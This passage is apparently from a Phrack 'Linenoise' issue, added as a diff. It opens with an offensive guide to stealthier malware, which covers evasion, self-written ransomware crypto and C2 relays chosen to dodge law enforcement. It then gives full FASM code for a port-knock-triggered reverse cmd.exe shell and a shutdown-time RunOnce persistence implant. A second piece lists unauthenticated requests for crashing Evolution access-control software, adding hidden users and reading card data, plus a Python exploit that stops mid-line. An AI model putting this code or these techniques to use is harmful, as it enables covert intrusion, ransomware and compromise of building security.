@@ -1,0 +1,3979 @@
+---
+title: Linenoise
+author: Phrack Staff
+---
+                           ==Phrack Inc.==
+
+              Volume 0x10, Issue 0x47, Phile #0x03 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=---------------------=[ L I N E N O I S E ]=---------------------------=|
+|=-----------------------------------------------------------------------=|
+|=------------------------=[ Phrack Staff ]=-----------------------------=|
+|=-----------------------------------------------------------------------=|
+
+    Linenoise is a collection of artifacts that do not fit elsewhere.
+    Short papers, corrections, brain dumps, late papers, etc..... :))
+
+Contents
+
+  1 - Practical tips and thoughts to improve your    -- SWaNk
+      malware stealthiness and increase campaign 
+      dwell time
+
+  2 - Bugs in Evolution Software Building            -- evildaemond
+      Access Control software
+
+  3 - The Weaponization of Automation                -- Xenon Hexafluoride
+
+  4 - Riding with the Chollimas: Our 100 day quest   -- MauroEldritch
+      to profile a North Korean State-Sponsored 
+      Threat Actor
+
+  5 - Master of Puppets - turning AV sandboxes       -- Grzegorz Tworek 
+      into a botnet
+
+  6 - Learning an ISA by force of will               -- iximeow
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 1 - Practical tips and thoughts to improve your malware ]=---------=|
+|=-=[     stealthiness and increase campaign dwell time       ]=---------=|
+|=-----------------------------------------------------------------------=|
+
+by SWaNk <contato@vectorcrow.com>
+
+
+--[ Table of Contents
+
+0.   About the Author
+1.   Preamble and scope
+2.   Malware scene evolution
+3.   Definitions
+3.1  Dwell time
+3.2  Fudness
+3.3  Windows messaging system
+3.4  Port knocking
+4.   The devil is in the details
+5.   Avoid patterns, reinvent the wheel
+6.   To stage, or not to stage, that is the question...
+7.   Relays and multiple protocols
+8.   Port knocking + RAW SOCKETS = Stealth bind
+9.   Abusing Windows messaging system to install persistence
+10.  Final Words
+11.  References
+
+
+--[ 0. About the Author
+
+  I tend to define myself as a malware enthusiast. I have been coding 
+malware since early 2k. My main skills are related to malware development
+and reverse engineering. Always available to malware, coffee, and beer.
+
+  I made some public contributions to the malware scene: 
+
++ LOLBAS Project - Different context, but the same technique published 
+  at 29a issue 7
+    https://lolbas-project.github.io/lolbas/Libraries/Desk/
++ New way to startup files - ShellExecute InstallScreenSaver API
+    https://vxug.fakedoma.in/zines/29a/29a7/Articles/29A-7.030.txt
++ The Fake Entry Point Trick
+    https://github.com/vxunderground/VXUG-Papers/blob/main/
+    The%20Fake%20Entry%20Point%20Trick.txt
++ Mocoh Polymorphic Engine
+    https://github.com/vxunderground/VXUG-Papers/blob/main/
+    Mocoh%20Polymorphic%20Engine.asm
+
+
+--[ 1. Preamble and scope
+
+  First of all, I need to praise and acknowledge the work done by the 
+coders of the past. I thank the virus coding community's pioneers, who 
+paved the way for knowledge dissemination without the lure of financial 
+gain. We have a debt to those who generously shared their Tactics, 
+Techniques, and Procedures (TTPs) in an era when the value lay solely in 
+advancing the art of coding elegant malware, not monetary rewards. 
+To them, I extend my gratitude.
+
+  This paper is not intended to be a comprehensive or definitive guide to
+evasion tactics. Instead, it provides a collection of techniques, tips, 
+and reflections that I have found effective while conducting offensive 
+operations using malware to accomplish my engagement objectives. Think of 
+it as input ideas to stimulate the offensive mindset necessary for coding 
+solid malware.
+
+  Some TTPs presented in this document are related to Windows OS. However,
+the main idea behind the TTP is holistic and can be applied to different 
+OS. I tried to make this document enjoyable for both new malware coders and
+experienced ones (who are now a bit afk because they are leading teams). 
+The idea was to initially provide strategic content regarding offensive 
+malware operations and gradually move on to the technical stuff, delivering
+code and TTPs (the fun part).
+
+  Since the world has changed and nobody shares novelties anymore, you may 
+be asking yourself why I'm putting effort into this paper and sharing it 
+for free. First, it is a way to keep the scene alive. Second, it is a way 
+to pay back the community. And my last and most important reason is that 
+I fucking miss the old times...
+
+
+--[ 2. Malware scene evolution
+
+  Today's malware scene is global and intricately intertwined with the 
+cybersecurity industry. The community's behavior regarding sharing new 
+TTPs have changed because companies and governments legally hire people to
+code and analyze malware. Therefore, new TTPs have financial value in this 
+market. While courses and certifications offer valuable insights that 
+reduce the learning course, they often provide outdated TTPs. Therefore, 
+in an industry where novel TTPs are both highly valuable and short-lived, 
+the unwillingness to share knowledge is understandable and a big trend.
+
+  This lack of knowledge sharing underscores the importance of initiatives
+like this one. By pooling our collective wisdom and experiences, we can 
+bridge the gap between theory and practice, arming practitioners with the 
+tools they need to stay ahead of emerging threats. This small contribution 
+to a community thrives on collaboration and shared learning.
+
+
+--[ 3. Definitions
+
+  This section will introduce some essential definitions in the context of 
+  malware development. If you are familiar with them, skip to the next 
+  section.
+
+
+--[ 3.1 Dwell time
+
+  Dwell time in the context of cybersecurity "is the time between an 
+attacker's initial penetration of an organization's environment and the 
+point at which the organization finds out the attacker is there" [1]. It is
+metric used by the defensive team to perceive if the defense is getting 
+better detecting threats.
+
+
+--[ 3.2 Fudness
+
+  The concept of FUDness, or Fully UnDetectable, is the ultimate aspiration 
+for adversaries seeking to evade detection and maintain operational 
+stealth. A FUD malware means it was meticulously crafted to bypass 
+traditional security measures and avoid detection by defensive mechanisms 
+in a specific engagement. 
+
+  FUDness is a state. You can be FUD now and be detected later. Therefore, 
+before engaging, you must be sure that your malware is FUD regarding the 
+target defense mechanisms. Achieving FUD normally requires innovative 
+techniques, obfuscation methods, and continuous adaptation to evade 
+evolving detection algorithms. You must understand and meticulously 
+analyze the behavior of security products to exploit weaknesses and blind
+spots in detection mechanisms.
+
+
+--[ 3.3 Windows messaging system
+
+  The Windows messaging system facilitates communication between different
+parts of a Windows operating system's graphical user interface (GUI) 
+application. When a application needs to communicate with another (such as
+when a button is clicked, or a window needs to be updated) it sends 
+messages.
+
+  In Section 9, our malware snippet will intercept specific System Shutdown 
+Messages [2] that indicate a system reboot/logoff/restart to install a 
+persistence that will exist in the system just before the shutdown and the 
+next login, reducing the detection window.
+
+
+--[ 3.4 Port knocking
+
+  Port knocking is a technique used to enhance network security by 
+obscuring the existence of services running on a server. It involves 
+dynamically altering firewall rules to open network ports in response to a
+sequence of connection attempts on predefined "knock" ports. Once the 
+correct sequence of "knocks" is detected, the firewall rules are modified 
+to allow temporary access to the desired service port. This technique helps
+a lot to increase your dwell time.
+
+
+--[ 4. The devil is in the details
+
+  As the old saying goes, "The devil is in the details," nowhere is this 
+more accurate than malware development. While the overarching goal may be
+to infiltrate systems and evade detection, the meticulous attention to 
+detail, particularly in error handling, ultimately determines the success or 
+failure of an offensive campaign. 
+
+  No matter how seemingly insignificant, errors can potentially betray the 
+presence of malware and undermine the entire operation. A single oversight, 
+a careless exception, can expose the carefully crafted piece of code and 
+alert defenders. Therefore, malware developers must adhere to a mantra of 
+precision and discretion, ensuring errors are handled with utmost care. 
+We can improve the dwell time by meticulously addressing mistakes behind 
+the scenes without alerting users or triggering defensive mechanisms. At 
+the end of the day, it is better to lose access to a network than be 
+spotted.
+
+
+--[ 5. Avoid patterns, reinvent the wheel
+
+  By avoiding code reuse and third-party libraries, malware authors can 
+make it more difficult for detection engineers to create signatures, 
+detection rules, and strategies. In my experience, this posture helps a 
+lot.
+
+  For example, I recently engaged with a ransomware detection solution. 
+The solution tries to collect the key used by ransomwares hooking Windows 
+crypto APIs [3] parameters. The defensive hypothesis is that the malware 
+coder will use Windows Cryptography APIs to encode files. The 
+reinvent-the-wheel strategy was fundamental in this engagement. I usually 
+use native OS APIs when it is strictly necessary. Therefore, I coded all 
+the cryptographic functions in the ransomware. Thus, the solution wasn't 
+ready for this move, making it impossible to achieve the key recovery.
+
+  Every environment has its own unique set of security measures and 
+defenses. By reinventing the wheel and customizing malware for each target,
+attackers can increase their chances of success by tailoring their tactics 
+to exploit specific vulnerabilities or weaknesses.
+
+  Reusing code can lead to attribution, as threat intelligence researchers 
+may identify similarities between malware samples or campaigns. By creating 
+unique malware from scratch, attackers can minimize the risk of attribution 
+and create more resilient, adaptable threats that are better equipped to 
+evade detection and bypass defenses.
+
+
+--[ 6. To stage, or not to stage, that is the question...
+
+  Staged and non-staged malware refers to different approaches to executing
+your malware. 
+
+  Non-staged malware delivers the entire malicious payload in a single 
+stage without additional components or downloads. The payload is typically 
+included in the initial executable or file. They are simple to code and do 
+not require communication with remote servers. However, Non-staged malware 
+has more detection surface to be explored by security solutions, as the 
+entire payload and functionalities are present in the artifact, increasing 
+the likelihood of detection. Additionally, they tend to be less adaptable 
+to changes in the threat landscape, as updates and modifications require 
+changes to the entire payload. However, when dealing with specific 
+scenarios, we must use Non-staged malware. 
+
+  Staged malware delivers the malicious payload in multiple stages, each 
+performing a specific function or task. Typically, the initial stage is a 
+lightweight loader or downloader that retrieves additional components or 
+payloads from different remote servers. They can be more challenging to 
+detect by security solutions, as the initial payload may be simple, almost
+benign, or have a low detection rate, allowing it to bypass initial 
+security checks. Additionally, it offers greater flexibility and 
+adaptability, as attackers can update and modify the subsequent stages, 
+providing functionalities to the malware when convenient. For example, you
+deliver your initial stage. No persistence and no fancy functionalities; 
+just download a shellcode and run it in the memory. The shellcode can 
+provide recon on the target to ensure you are in a safe environment. In 
+this case, you have the option to send the subsequent stages when you 
+identify low detection risk. The initial stages are trivial to code; you 
+can take risks. It differs from complex shellcodes and expensive exploits;
+creating them takes a lot of time and money. In this case, you must make a
+risk analysis regarding the target's defensive capabilities to decide if 
+the chances of detection are acceptable.
+
+  In summary, The choice between staged and non-staged malware depends on
+the attacker's specific objectives and requirements, as well as the 
+targeted environment and defenses. I tend to choose staged malware when 
+possible because it offers the necessary compartmentation to protect 
+critical parts of the malware and provides more flexibility during the 
+engagement. 
+
+
+--[ 7. Relays and multiple protocols
+
+  One proven successful strategy is using a pool of intermediary relays to
+protect the malware Command and Control (C2) infrastructure. It comprises 
+a pool of intermediary servers or relays that receive information in one 
+protocol and forward it using another. 
+
+  Using different protocols to receive and send commands to the malware can
+reduce the attribution and detection risks. Some security vendors collect 
+and sell massive sets of metadata about the IP traffic flowing across the 
+Internet (NetFlows [4]). A specific vendor promises 95% of the Internet 
+traffic flows. This data is interesting for supporting flow-based traffic 
+analysis to infer attribution. The idea here is to make the inference more
+difficult by increasing the giant mass of data they need to process. 
+
+  One key concept in NetFlow is the IP flow tuple, which uniquely 
+identifies individual flows of network traffic. The classic IP flow tuple 
+consists of source IP, destination IP, ports, protocol type, and quality 
+of service. We intend to deny the possibility of filtering the protocol 
+type to reduce data. 
+
+  By receiving and transmitting data using different protocols (e.g., a 
+relay that receives data using TCP and forwards it to another relay using 
+UDP), we force the analysis to consider all protocol types, increasing the
+amount of data to be analyzed. Filtering protocols will result in failure 
+to infer a relation among traffic flows. In the worst-case scenario, we 
+create difficulties, forcing the adversary to spend more computational 
+resources and probably time trying to attribute us.
+
+  Relay networks provide malware operators with a dynamic and resilient 
+infrastructure that can adapt to changes in the threat landscape. By 
+leveraging a pool of relays, malware can quickly switch between different
+communication channels and protocols, making it challenging for defenders
+to effectively track and block C&C traffic.
+
+  By utilizing relays located in different geographic regions, malware 
+operators can further obfuscate their C2 infrastructure and evade detection
+by defenders. This geographical diversity makes it difficult for defenders 
+to pinpoint the origin of malicious traffic and identify the underlying 
+infrastructure supporting the malware campaign. Additionally, using a pool
+of relays, where the same relay takes time to be used again, helps avoid 
+traffic patterns and provides extra compartmentation and attribution 
+resilience when installed in different countries regarding law enforcement
+collaboration. The best scenario is when the countries don't have a good 
+international relationship, and you have two relays forwarding traffic 
+between those countries.
+
+
+--[ 8. Port knocking + RAW SOCKETS = Stealth bind
+
+  As stated in 3.4, port knocking offers a powerful mechanism for enhancing
+malware operations' stealthiness by concealing service ports, dynamically 
+controlling access to services, and customizing communication channels 
+based on predefined knock sequences.
+
+  Raw sockets, also known as raw packet sockets, are a type of network 
+socket that provides access to network protocols at a lower level than 
+traditional sockets. Unlike standard sockets, which handle communication at
+the transport layer (e.g., TCP, UDP), raw sockets allow applications to 
+interact directly with the network layer (e.g., IP) and even lower, 
+bypassing some of the higher-level protocol stack. They are commonly used 
+for packet sniffing and network analysis purposes. 
+
+  Applications can use raw sockets to capture incoming and outgoing network 
+packets and inspect their contents; we will exploit this functionality. 
+It's important to note that raw sockets typically require elevated 
+privileges to operate. Therefore, we use this technique when the target has
+already been compromised, and you have gained admin privileges.
+
+  The strategy here is to code a malware that can sniff the network and, 
+depending on the sequence of the perceived traffic (port knock), the 
+malware reacts to it. In this example, we will use a simple reverse TCP 
+connection to the Source IP that triggered the port knock. This way, we can
+"Listen" to connections without binding a port. Talk is cheap, show me the
+code...
+
+<------ start of code ------>
+
+format   pe console
+entry    start
+include 'win32ax.inc'
+
+struct IP_Header
+   iph_verlen     db  0
+   iph_tos        db  0
+   iph_len        dw  0
+   iph_id         dw  0
+   iph_offset     dw  0
+   iph_ttl        db  0
+   iph_proto      db  0
+   iph_xsum       dw  0
+   iph_src        dd  0
+   iph_dest       dd  0
+ends
+
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+.data
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+  s_wsa          WSADATA
+  s_addr         sockaddr_in
+
+  r_wsa          WSADATA
+  r_addr         sockaddr_in
+
+  s_sock         dd ?
+  r_sock         dd ?
+
+  flag           dd 1
+
+  PORT           = 8080
+  SIO_RCVALL     = 0x98000001
+  IPPROTO_IP     = 0x0
+  IPPROTO_TCP    = 0x6
+  IPPROTO_ICMP   = 0x1
+
+  sinfo          STARTUPINFO
+  pinfo          PROCESS_INFORMATION
+
+  align          16
+  buff           IP_Header
+
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+.code
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+start:
+        invoke   WSAStartup,0202h,s_wsa
+
+        invoke   gethostname,buff,64
+        invoke   gethostbyname,buff
+        mov      eax,[eax+12]
+        mov      eax,[eax]
+        mov      eax,[eax]
+
+        mov      [s_addr.sin_addr],eax
+        mov      [s_addr.sin_port],0
+        mov      [s_addr.sin_family],AF_INET
+
+        invoke   socket,AF_INET,SOCK_RAW,IPPROTO_IP
+        mov      [s_sock],eax
+        or       eax,eax
+        jnz      @f
+        jmp      @exit
+
+@@:
+        invoke   bind,[s_sock],s_addr,16
+        or       eax,eax
+        jz       @f
+        jmp      @exit
+
+@@:
+        invoke   ioctlsocket,[s_sock],SIO_RCVALL,flag ;Receive All Packet
+        or       eax,eax
+        jz       @sniff
+        jmp      @exit
+
+@sniff:
+        invoke   recv,[s_sock],buff,512,0
+
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+; Here we check if the TTL is equal to 42.
+; the Answer to the Ultimate Question of Life, The Universe, and
+; Everything!!!
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+        ;is this ICMP?
+        xor      ebx,ebx
+        mov      bl,[buff.iph_proto]
+        cmp      bl,IPPROTO_ICMP
+        jne      @sniff
+
+        ;ICMP, then put the packet TTL value in al
+        xor      eax,eax
+        mov      al,[buff.iph_ttl]
+
+        ;TTL = 42?
+        cmp      al,42d
+        je       trigger
+        jmp      @sniff
+
+@exit:
+        invoke   ExitProcess,0
+
+trigger:
+        cinvoke  printf,<'[*] KNOCK, KNOCK! TTL = %05d',13,10,0>,eax
+
+@@:
+       ;just a simple reverse TCP ahead, it will connect to the src IP
+        invoke   WSAStartup,0202h,r_wsa
+        test     eax,eax
+        jnz      @exit
+
+        invoke   WSASocketA,AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0
+        cmp      eax,-1
+        jz       @exit
+
+        mov      [r_sock],eax
+        mov      [r_addr.sin_family],AF_INET
+
+        invoke   htons,PORT
+        mov      [r_addr.sin_port],ax
+
+        invoke   inet_ntoa,[buff.iph_src]
+        invoke   gethostbyname,eax
+
+        mov      eax,[eax+12]
+        mov      eax,[eax]
+        mov      eax,[eax]
+        mov      [r_addr.sin_addr],eax
+        mov      eax,[r_sock]
+        mov      [sinfo.hStdInput],eax
+        mov      [sinfo.hStdOutput],eax
+        mov      [sinfo.hStdError],eax
+
+        mov      dword [sinfo.cb],sizeof.STARTUPINFO
+        mov      dword [sinfo.dwFlags],STARTF_USESHOWWINDOW+\
+                 STARTF_USESTDHANDLES
+
+        invoke   connect, [r_sock],r_addr,sizeof.sockaddr_in
+        cmp      eax,0
+        jne      @sniff
+
+        invoke   CreateProcess,0, <"cmd.exe">,0,0,TRUE,0,0,0,\
+                 sinfo,pinfo
+        invoke   WaitForSingleObject,dword[pinfo.hProcess],-1
+        invoke   Sleep,10000
+        jmp      @b
+
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+section '.idata' import data readable
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+library  kernel32,'kernel32.dll',\
+         user32,'user32.dll',\
+         wsock32,'wsock32.dll',\
+         msvcrt,'msvcrt.dll',\
+         ws2_32,'ws2_32.dll'
+
+import   msvcrt,\
+            printf,'printf',\
+            scanf,'scanf'
+
+        import ws2_32,\
+            WSACleanup,'WSACleanup',\
+            listen,'listen',\
+            accept,'accept',\
+            WSASocketA,'WSASocketA'
+
+include 'api\kernel32.inc'
+include 'api\user32.inc'
+include 'api\wsock32.inc'
+
+<------ end of code ------>
+
+  The code provided is written in FASM syntax (x86 for Windows). It sniff
+the packets waiting for a specially crafted packet with a TTL (Time To 
+Live) value of 42 to his host. If the TTL value matches 42, it triggers
+the execution of a reverse TCP shell to connect back to the source IP 
+address from which the TTL 42 packet was received.
+
+Here's a breakdown of what the code does:
+
+  1. It sets up a raw socket (SOCK_RAW) to receive all IP packets.
+  2. It enables the socket to receive all packets calling ioctlsocket API
+     with the SIO_RCVALL flag. When SIO_RCVALL is enabled on a raw socket,
+     it receives all incoming packets on the associated network interface,
+     regardless of their destination IP address.
+  3. It enters a loop to sniff incoming packets. When a packet is received
+     It extracts the TTL value from the IP header. If the TTL value is 42,
+     it triggers the execution of a reverse TCP shell.
+  4. The reverse TCP shell connects back to the source IP address from 
+     which the TTL 42 packet was received.
+
+  This example is using TTL on purpose... You have to change the trigger 
+to work in the real world because the TTL will change depending on the
+hops quantity. No free lunch. You must understand how this 
+stuff works to use it properly.
+
+  It's important to note that detecting this malware in its dormant state
+(sniffing) can be challenging for regular users and newbie forensics
+analysts because tools used to perform traffic analysis like netstat, 
+System Informer, TCPView, Wireshark, and others cannot identify this 
+technique.
+
+  Another usage of sniffing is measuring the host's average traffic
+regarding protocols and data volume. This can be useful when facing Data
+Loss Protection (DLP) solutions. In that case, we must avoid exceeding the
+protocol's traffic average volume while exfiltrating data. 
+
+  Finally, this code is independent of third-party libs or frameworks like 
+Winpcap or .NET. This characteristic is desirable when coding malware 
+since compatibility is paramount most of the time.
+
+
+--[ 9. Abusing Windows messaging system to install persistence
+
+  Windows GUI applications that use the Messages in the Windows messaging
+system listen and send messages to interact with other applications, as 
+stated in section 3.3. Usually, a message is sent to specific windows 
+identified by their handles. However, there are cases where messages are
+broadcasted to multiple windows or all windows in the system. For example,
+a "WM_SYSCOMMAND" message [5] with the "SC_MONITORPOWER" parameter (wParam)
+is usually sent to all top-level windows using the handle HWND_BROADCAST 
+[6]. This way, all windows receive a message informing that the system is 
+entering a power-saving state, such as when the monitor is about to be 
+turned off. This normal behavior can be abused to start malicious routines
+when the application perceives specific messages.
+
+  We will abuse system shutdown messages to install persistence in the
+system. This approach's advantage is that the persistence will only exist
+seconds after a logoff, reboot, or shutdown command and the startup. 
+
+  In the example code provided, we install the persistence in the registry
+at HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce. The
+RunOnce key is used to specify programs that should be run once, 
+automatically, when Windows starts up. Unlike the Run key, which specifies 
+programs to run every time Windows starts, the RunOnce key is designed for
+one-time execution of programs or commands. Once run, then the system 
+automatically deletes the key.
+
+  The issue occurs when the machine resets non-gracefully, like a BSOD or a 
+hard reset. In this case, we will lose the system's persistence. On the
+other hand, this TTP has a short exposure time, so using forensics tools to
+search for persistence will be ineffective. If the risk of losing access is
+not acceptable, you should use another technique or a backup persistence. 
+
+  The code is self-explanatory. We will monitor the messages 
+WM_QUERYENDSESSION (when the user chooses to end the session or when an 
+application calls one of the system shutdown functions),  WM_ENDSESSION 
+(informs the application whether the session is ending), and 
+WM_POWERBROADCAST with lParam PBT_APMSUSPEND (the computer is about to 
+enter a suspended state). If the application finds one of them, we 
+install the persistence in the registry. Simple as that.
+
+<------ start of code ------>
+
+format PE64 GUI 5.0
+entry start
+
+include 'win64ax.inc'
+
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+section '.text' code readable executable
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+  start:
+        sub     rsp,8
+        invoke  MessageBoxA,0 ,'survived bitches!', 'SWaNk 2024', 40h
+
+        invoke  GetModuleHandle,0
+        mov     [wc.hInstance],rax
+        invoke  LoadIcon,0,IDI_APPLICATION
+        mov     [wc.hIcon],rax
+        mov     [wc.hIconSm],rax
+        invoke  LoadCursor,0,IDC_ARROW
+        mov     [wc.hCursor],rax
+        invoke  RegisterClassEx,wc
+        test    rax,rax
+        jz      exit
+
+        invoke  CreateWindowEx,WS_EX_TOOLWINDOW or WS_EX_TOPMOST,_class,\
+                _title,WS_SYSMENU+WS_DLGFRAME,128,128,256,192,NULL,NULL,\
+                [wc.hInstance],NULL
+        test    rax,rax
+        jz      exit
+
+  msg_loop:
+        invoke  GetMessage,msg,NULL,0,0
+        cmp     eax,1
+        jb      exit
+        jne     msg_loop
+        invoke  TranslateMessage,msg
+        invoke  DispatchMessage,msg
+        jmp     msg_loop
+
+  exit:
+        invoke  ExitProcess,[msg.wParam]
+
+proc WindowProc uses rbx rsi rdi, hwnd,wmsg,wparam,lparam
+
+        cmp     edx,WM_QUERYENDSESSION
+        je      .wmqueryendsession
+        cmp     edx,WM_POWERBROADCAST
+        je      .wmpowerbroadcast
+        cmp     edx,WM_ENDSESSION
+        je      .wmqueryendsession
+        cmp     edx,WM_DESTROY
+        je      .wmdestroy
+
+  .defwndproc:
+        invoke  DefWindowProc,rcx,rdx,r8,r9
+        jmp     .finish
+
+  .wmpowerbroadcast:
+        cmp  r9d, 0x80000000
+        jne  .finish
+
+  .wmqueryendsession:
+        invoke  RegCreateKeyExA, HKEY_CURRENT_USER,AutoKey,NULL,NULL,\
+                NULL,KEY_ALL_ACCESS,NULL,hkey,NULL
+        cmp     rax,0
+        jne     exit
+
+        invoke  GetModuleFileName,NULL,szFile,256
+        cmp     rax,0
+        je      exit
+
+        invoke  lstrlen,szFile
+        cmp     rax,0
+        jbe     exit
+
+        invoke  RegSetValueExA,[hkey],ValueName,NULL,REG_SZ,szFile,eax
+        cmp     rax,0
+        jne     exit
+
+        invoke  RegCloseKey,[hkey]
+        jmp     .finish
+
+  .wmdestroy:
+        invoke  PostQuitMessage,0
+        xor     eax,eax
+
+  .finish:
+        ret
+endp
+
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+section '.data' data readable writeable
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+  AutoKey   db 'Software\Microsoft\Windows\CurrentVersion\RunOnce',0
+  ValueName db 'EvilMalware',0
+  hkey      dd ?
+  szFile    dd ?
+
+  _title TCHAR 'title',0
+  _class TCHAR 'class',0
+
+  wc WNDCLASSEX sizeof.WNDCLASSEX,0,WindowProc,0,0,NULL,NULL,NULL,\
+     COLOR_BTNFACE+1,NULL,_class,NULL
+
+  msg MSG
+
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+section '.idata' import data readable writeable
+;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+  library kernel32,'KERNEL32.DLL',\
+          user32,'USER32.DLL',\
+          advapi32,'ADVAPI32.DLL'
+
+  include 'api\kernel32.inc'
+  include 'api\user32.inc'
+  include 'api\advapi32.inc'
+
+<------ end of code ------>
+
+--[ 10. Final Words
+
+  "Quem refresca cu de pato eh lagoa [<o>]" VX Forever!
+
+
+--[ 11. References
+
+ [1] Why The Dwell Time Of Cyberattacks Has Not Changed (2021) 
+     https://www.forbes.com/sites/forbestechcouncil/2021/05/03/
+     why-the-dwell-time-of-cyberattacks-has-not-changed/?sh=e32b93b457d8  
+ [2] System Shutdown Messages (2021)
+     https://learn.microsoft.com/en-us/windows/win32/shutdown/
+     system-shutdown-messages
+ [3] Cryptography Functions (2021)
+     https://learn.microsoft.com/en-us/windows/win32/seccrypto/
+     cryptography-functions?source=recommendations
+ [4] RFC 3954 NetFlow Version 9 (2004)
+     https://www.ietf.org/rfc/rfc3954.txt
+ [5] WM_SYSCOMMAND message
+     https://learn.microsoft.com/en-us/windows/win32/menurc/wm-syscommand
+ [6] SendMessage function (winuser.h)
+     https://learn.microsoft.com/en-us/windows/win32/api/winuser/
+     nf-winuser-sendmessage
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 2 - Bugs in Evolution Software Building Access Control software ]=-=|
+|=-----------------------------------------------------------------------=|
+
+by evildaemond
+
+Evolution Software is a wild piece of software, used for access control 
+systems in buildings in Australia. The software has been out since the
+2000s and still gets updates (Last update March 30th 2024 at time of this
+writing). One of the wild parts of this software is the web interface. If 
+you enable this web interface, you get one of the most poorly optimised 
+webpages you've ever seen, and some of the worst security I've witnessed.
+This thing is like a CTF, and it's harder to not find vulnerabilities than 
+to find them.
+
+Here are some highlights:
+
+1. Trigger a full application crash
+
+  GET /DAL_ADD?' HTTP/1.1
+
+2. Add a user to the system
+
+Just add a user to the system, no authentication needed, and if you
+chose operator_id as 0, it won't appear in the user creation logs or
+show when they were created
+
+  POST /USER_CHANGE HTTP/1.1
+  ...
+  user_operator_id=0&user_id=0&user_name=JamesSmith&1=on&loc_form_user_
+  card_imptrinted=0&loc_form_user_als_sitecode=1&loc_form_user_als_sitec
+  ode_new=1&loc_form_user_card=1&loc_form_user_data1=&loc_form_user_data2
+  =&command=
+
+3. Get any users card data (FC and CN)
+
+  POST /DESKTOP_EDIT_USER_GET_CARD_FIELDS HTTP/1.1
+  ...
+  1
+  2
+  get_code
+
+4. PoC
+
+Below is a poorly written Python PoC chatGPT wrote for it, if you want to 
+hide it in the next edition somewhere feel free to
+
+import requests
+import argparse
+import re
+from bs4 import BeautifulSoup
+
+def application_crash(host, port):
+    try:
+        url = f"http://{host}:{port}/DAL_ADD?'"
+        response = requests.get(url)
+        response.close()
+        # In case of any response, return it for information purposes
+        return 'Request Sent'
+    except:
+        return 'Request Sent'
+
+def request_all_users(host, port):
+    url = f'http://{host}:{port}/ID1_Users'
+    headers = {
+        'Host': host,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) \
+Gecko/20100101 Firefox/66.0",
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,\
+image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding': 'gzip, deflate, br',
+        "Connection": "keep-alive"
+    }
+    response = requests.get(url, headers=headers)
+    response.close()
+    soup = BeautifulSoup(response.text, 'html.parser')
+   
+    # Check for session expiration or not logged in error response
+    script_tag = soup.find('script', string='opener.location="UnLoggedPage.html"')
+    if script_tag:
+        return "Error: Session appears to have expired, or user not logged in."
+   
+    # Check if the expected user table exists
+    table = soup.find("table", {"id": "Users"})
+    if table:
+        users = []
+        for row in table.find_all("tr")[1:]:  # skipping first row as it's a header
+            cols = row.find_all("td")
+            user_id = cols[0]['id']
+            user_name = cols[0].text.strip()
+            users.append((user_id, user_name))
+   
+        output = "\n\nUsers in System\n|ID|Name|\n|---|---|"
+        for user in users:
+            output += f"\n|{user[0]}|{user[1]}|"
+        return output
+    else:
+        return "Error: Could not find the expected user table in the response."
+   
+def return_last_scanned_card(host, port):
+    url = f'http://{host}:{port}/DESKTOP_EDIT_USER_GET_CARD'
+    headers = {
+        'Host': host,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) \
+Gecko/20100101 Firefox/66.0",
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,\
+image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Encoding': 'gzip, deflate, br',
+        "Connection": "keep-alive"
+    }
+   
+    response = requests.post(url, headers=headers)
+    response.close()
+
+    # Assuming the response body contains the values in the order described.
+    lines = response.text.strip().split('\n')
+   
+    if lines[0] == 'true':
+        hex_value = lines[1]
+        site_code = lines[2]
+        card_number = lines[3]
+       
+        output = "\n|Site Code/Facility Number|Card Number|Hex|\n|---|---|---|\n"
+        output += f"|{site_code}|{card_number}|{hex_value}|"
+        return output
+    else:
+        return "\nNo last scanned card found, either a registered reader \
+has not been configured, or no cards have been swiped in \
